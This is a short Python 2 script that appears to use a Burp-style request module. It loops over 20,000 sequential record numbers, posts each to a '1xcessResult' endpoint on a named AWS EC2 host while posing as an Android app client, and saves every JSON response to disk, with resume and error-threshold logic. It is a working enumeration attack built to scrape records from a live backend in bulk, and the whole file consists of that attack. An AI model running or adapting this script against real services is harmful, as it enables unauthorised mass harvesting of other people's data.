from burp import *
import time, os

## Parameters
start_range = 20001
folder		= 'records21'
total		= 20000

error_threshold = 3
skip_errors = [1003]


c = """
POST /SundownSrv/1xcessResult HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Dalvik/2.1.0
Host: ec2-52-34-46-127.us-west-2.compute.amazonaws.com
Connection: close
Accept-Encoding: gzip
Content-Length: 9

no=%s&
"""

thres_cnt = error_threshold
end_range = start_range + total
try:
	# Searches for the last record saved on the server
	ls = os.listdir('records21')
	ls.sort()
	start_range = int(ls[-1][:-4]) + 1
except:
	pass

# Loop through all the range
for i in range(start_range, end_range):
	## Sleep for a while
	if i % 10 == 0:
		print '%d%% Done. %d/%d' % (((i - start_range) * 100) / total, (i - start_range), end_range - start_range)
		time.sleep(3)

	# Fetch some requests
	r = code('http', c % (i))
	rjson = r.json()

	# An error occured
	if not rjson[u'result'] == 0:
		if rjson[u'result'] in skip_errors:
			continue

		# If Error above a certain threshold then quit application		
		thres_cnt = thres_cnt - 1
		if thres_cnt > 0:
			print 'Error: %d, Code: %d' % (rjson[u'result'], i)
			continue

		exit()

	thres_cnt = error_threshold
	# Save to a file
	with open('%s/%d.txt' % (folder, i), 'w') as f:
		f.write(r.text.encode('ascii', 'ignore').decode('ascii'))

	
